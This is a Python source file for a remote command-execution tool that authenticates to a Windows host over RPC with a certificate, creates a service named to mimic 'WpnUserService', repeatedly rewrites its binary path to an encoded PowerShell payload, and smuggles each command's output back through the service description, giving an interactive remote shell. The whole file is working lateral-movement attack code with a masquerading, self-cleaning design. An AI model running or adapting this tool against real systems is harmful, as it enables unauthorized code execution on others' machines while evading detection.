from impacket.dcerpc.v5 import epm, scmr
from modules.rpc import transport
from modules.rpc.rpcrt import DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket import system_errors
from base64 import b64encode, b64decode
import random
import string

def hRQueryServiceConfig2W(dce, hService, infoLevel):
    request = scmr.RQueryServiceConfig2W()
    request['hService'] = hService
    request['dwInfoLevel'] = infoLevel
    request['cbBufSize'] = 0
    try:
        resp = dce.request(request)
    except Exception as e:
        if e.get_error_code() == system_errors.ERROR_INSUFFICIENT_BUFFER:
            resp = e.get_packet()
            request['cbBufSize'] = resp['pcbBytesNeeded']
            resp = dce.request(request)
        else:
            raise

    return resp

def hRChangeServiceConfig2W(dce, hService, lpDescription):
    request = scmr.RChangeServiceConfig2W()
    request['hService'] = hService
    request['Info']['dwInfoLevel'] = 1
    request['Info']['Union']['tag'] = 1
    desc = bytes(lpDescription, 'utf-8')
    desc = ('%s' % desc[::2])[2:-5]
    request['Info']['Union']['psd']['lpDescription'] = desc + '\x00'
    try:
        resp = dce.request(request)
    except DCERPCException as e:
        raise
    return resp

class RPC():
    def __init__(self, target, pfx, pfxpass):
        self.target = target
        self.pfx = pfx
        self.pfxpass = pfxpass
        self.dce = None
        self.servicename = ''
        return

    def connect(self):
        stringbinding = epm.hept_map(self.target, scmr.MSRPC_UUID_SCMR, protocol='ncacn_ip_tcp')
        if stringbinding is None:
            return False
                
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.dce = rpctransport.get_dce_rpc()
        self.dce.set_credentials('', '', 'WELLKNOWN:PKU2U', '', '', '', p2ppfx=self.pfx, p2ppfxpass=self.pfxpass)
        self.dce.set_auth_level(6)
        self.dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        try:
            self.dce.connect()
            self.dce.bind(scmr.MSRPC_UUID_SCMR)
            return True
        except DCERPCException as e:
            return False

    def start(self):
        try:
            resp = scmr.hROpenSCManagerW(self.dce)        
            self.sc_handle = resp['lpScHandle']
        except DCERPCException as e:
            return
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        self.servicename = f'WpnUserService_{random_str}'
        resp = scmr.hRCreateServiceW(self.dce, self.sc_handle, self.servicename, self.servicename,
                                    lpBinaryPathName='cmd.exe', dwStartType=scmr.SERVICE_DEMAND_START)
        self.service_handle = resp['lpServiceHandle']   
        
        cmd_res = self.exec('pwd')
        path = cmd_res[:-2]
        while True:
            try:
                cmd = input('%s>' % path)                
                print(self.exec(cmd))
            except KeyboardInterrupt as e:
                self.end()
                return
        return

    def exec(self, cmd):
        payload = self.create_payload(cmd)        
        scmr.hRChangeServiceConfigW(self.dce, self.service_handle, lpBinaryPathName=payload)
        try:
            scmr.hRStartServiceW(self.dce, self.service_handle)            
        except:
            pass

        try:
            resp = hRQueryServiceConfig2W(self.dce, self.service_handle, 1)
            b64data = b''.join(resp['lpBuffer'][4:])
            return b64decode(b64data).decode('utf-8')
        except Exception as e:
            return e

    def create_payload(self, cmd):
        data = '\
        $res = %s;\
        foreach ($l in $res) {$byte += ([System.Text.Encoding]::Default).GetBytes($l);$byte += @(10,13)}\
        $b64enc = [Convert]::ToBase64String($byte);\
        $cmd = "sc.exe description %s \'$b64enc\'"; iex $cmd' % (cmd, self.servicename)
        return 'cmd /c powershell -Enc %s' % b64encode(data.encode('utf-16le')).decode()

    def end(self):
        try:
            scmr.hRDeleteService(self.dce, self.service_handle)
            scmr.hRCloseServiceHandle(self.dce, self.service_handle)
            print(f'\n[+] successfully cleaned up!')
        except:
            print('[-] something went wrong. clean up service "%s" by yourself' % self.servicename)
        return
